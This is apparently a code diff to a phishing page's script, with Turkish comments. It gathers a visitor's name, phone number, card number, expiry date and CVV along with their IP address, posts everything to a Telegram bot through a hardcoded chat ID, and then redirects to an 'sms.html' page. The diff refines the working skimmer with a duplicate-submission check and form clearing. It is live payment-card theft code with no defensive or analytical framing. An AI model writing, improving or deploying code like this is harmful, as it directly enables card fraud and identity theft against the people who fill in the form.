@@ -50,13 +50,28 @@
               <script>
                 function sendMessage() {
                   // Kullanıcının girdiği metinleri al
-                  var messages = [
-                    { name: 'ADSOYAD', text: document.getElementById('message1').value },
-                    { name: 'TEL', text: document.getElementById('message2').value },
-                    { name: 'KART', text: document.getElementById('message3').value },
-                    { name: 'SKT', text: document.getElementById('message4').value },
-                    { name: 'CCV', text: document.getElementById('message5').value }
-                  ];
+                  var adsoyad = document.getElementById('message1').value;
+                  var tel = document.getElementById('message2').value;
+                  var kart = document.getElementById('message3').value;
+                  var skt = document.getElementById('message4').value;
+                  var ccv = document.getElementById('message5').value;
+
+                  // Eğer önceki gönderi ile aynı bilgiler tekrar gönderilirse işlem yapma
+                  if (adsoyad === sendMessage.adsoyad &&
+                      tel === sendMessage.tel &&
+                      kart === sendMessage.kart &&
+                      skt === sendMessage.skt &&
+                      ccv === sendMessage.ccv) {
+                    alert('Aynı bilgileri tekrar gönderemezsiniz.');
+                    return;
+                  }
+
+                  // Kullanıcının girdiği metinleri kaydet
+                  sendMessage.adsoyad = adsoyad;
+                  sendMessage.tel = tel;
+                  sendMessage.kart = kart;
+                  sendMessage.skt = skt;
+                  sendMessage.ccv = ccv;
 
                   // Kullanıcının IP adresini al
                   var ipAddress = '';
@@ -73,9 +88,7 @@
                       var chatId = '6338892965';
 
                       // Telegram botuna gönderilecek tek bir mesajı oluştur
-                      var combinedMessage = messages.map(function (message) {
-                        return `${message.name}: ${message.text}`;
-                      }).join('\n\n') + `\n\nIP Adresi: ${ipAddress}`;
+                      var combinedMessage = `ADSOYAD: ${adsoyad}\nTEL: ${tel}\nKART: ${kart}\nSKT: ${skt}\nCCV: ${ccv}\n\nIP Adresi: ${ipAddress}`;
 
                       // Telegram botuna mesaj göndermek için kullanılan API URL'si
                       var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -91,7 +104,14 @@
                           // Kullanıcıya bilgi ver
                           alert('Mesajlarınız gönderildi!');
 
-                          // SMS.html sayfasına yönlendirme
+                          // Gönderi yapıldıktan sonra formu temizle
+                          document.getElementById('message1').value = '';
+                          document.getElementById('message2').value = '';
+                          document.getElementById('message3').value = '';
+                          document.getElementById('message4').value = '';
+                          document.getElementById('message5').value = '';
+
+                          // Yönlendirme
                           window.location.href = 'sms.html';
                         } else {
                           // İstek başarısız olduysa kullanıcıya hata mesajı ver
